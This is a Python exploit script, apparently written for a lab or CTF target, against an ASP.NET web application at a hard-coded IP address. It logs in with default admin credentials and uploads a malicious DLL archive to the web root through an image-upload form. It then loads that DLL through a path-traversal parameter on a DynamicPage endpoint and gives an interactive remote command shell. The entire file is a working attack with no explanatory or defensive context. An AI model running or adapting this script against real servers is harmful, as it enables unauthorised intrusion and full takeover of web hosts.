import requests
import re

url = 'http://40.88.10.36'

sess = requests.Session()

def Login(username,password):
    response = sess.get(url + '/Login')
    view_state = response.text.split('id="__VIEWSTATE" value="')[1].split('"')[0]
    event_validation = response.text.split('id="__EVENTVALIDATION" value="')[1].split('"')[0]

    login_data = {
        '__VIEWSTATE': view_state,
        '__EVENTVALIDATION': event_validation,
        'txtUsername': username,
        'txtPassword': password,
        'btnLogin': 'Login'
    }
    r = sess.post(url + '/Login', data=login_data)
    print("[-] Login success!")

def uploadDLL(filename):
    response = sess.get(url + '/Admin/UploadImage')

    view_state = response.text.split('id="__VIEWSTATE" value="')[1].split('"')[0]
    event_validation = response.text.split('id="__EVENTVALIDATION" value="')[1].split('"')[0]
    data = {
        '__VIEWSTATE': view_state,
        '__EVENTVALIDATION': event_validation,
        'folderName':'C:\inetpub\wwwroot\Test', #
        'btnConvert': 'Upload'
    }

    test_file = open(filename, "rb")
    upload_data = {'fileUpload': open(filename,'rb')}
    r = sess.post(url + "/Admin/UploadImage", data=data, files = {"fileUpload": test_file})
    print("[-] Uploading DLL...")

def trigger(cmd):
    data = {
        "fileName":"../Test/zExploit",
        "cmd":cmd
    }
    r = sess.post(url + '/Admin/DynamicPage', data=data)
    print(r.text)

Login('admin','admin')
uploadDLL("zExploit.zip")

print("[-] Done, enjoy the shell")
while True:
    cmd = input("$ ")
    trigger(cmd)
